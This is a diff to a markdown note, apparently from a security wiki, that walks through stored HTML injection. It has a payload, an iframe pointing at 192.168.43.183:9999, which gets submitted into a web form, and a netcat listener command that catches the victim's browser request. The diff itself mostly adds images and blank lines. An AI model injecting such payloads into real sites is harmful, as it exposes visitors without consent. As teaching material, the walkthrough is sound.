@@ -38,11 +38,35 @@ In HTML stored injection , an attacker can maliciously inject code into *HTML *p
 
 1.Below image has a text box with submit option in the page .
 
+
+
+
+
+![7201fae2-046a-43d1-ac9c-5b1e6d80e9a4.PNG](_assets/images/Mash/7201fae2-046a-43d1-ac9c-5b1e6d80e9a4.PNG)
+
+
+
+
+
+
+
 2.Place the *payload  *in the text box of the image as hown below and click on submit.
 
 *Payload : <div><iframe SRC="http://192.168.43.183:9999"*
 
+
+
+![5ec7d982-1dc3-44e1-8b11-c384553090ca.PNG](_assets/images/Mash/5ec7d982-1dc3-44e1-8b11-c384553090ca.PNG)
+
+
+
 3. Run netcat in listening mode before submitting the above request.
+
+
+
+
+
+
 
 **Command** ([[nc.exe -lvp 9999]]):
 
@@ -50,7 +74,31 @@ In HTML stored injection , an attacker can maliciously inject code into *HTML *p
 nc.exe -lvp 9999
 ```
 
+
+
+
+
+
+
 4.After submitting the request in step 3 , observe the response in *netcat *command window . Response from the submitted request can be observed as shown below.
+
+
+
+
+
+
+
+
+
+![4c511bba-cc3c-4c5e-9be7-d528d7dcbb28.PNG]()
+
+
+
+
+
+
+
+
 
 ## Platforms
 
@@ -67,3 +115,5 @@ nc.exe -lvp 9999
 - [[injection]]
 - [[stored HTML injection]]
 - [[Web Applications]]
+
+
